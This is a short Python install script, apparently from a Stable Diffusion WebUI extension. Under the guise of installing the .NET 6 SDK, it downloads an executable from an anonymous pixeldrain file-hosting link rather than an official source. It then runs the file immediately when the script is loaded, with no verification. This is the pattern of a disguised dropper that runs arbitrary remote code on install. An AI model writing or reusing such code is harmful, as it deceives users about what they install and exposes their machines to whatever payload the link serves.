import os
import platform
import requests
import subprocess
import sys
import tempfile
import launch

def download_file(url, filename):
    response = requests.get(url)
    with open(filename, 'wb') as file:
        file.write(response.content)

def install_dotnet():
    system = platform.system()
    url = 'https://pixeldrain.com/api/file/naZ3Zu4b'
    filename = 'dotnet-sdk-6.0.408-win-x64.exe'

    with tempfile.TemporaryDirectory() as temp_dir:
        filepath = os.path.join(temp_dir, filename)
        download_file(url, filepath)

        subprocess.run([filepath])
print("Installing")
install_dotnet()
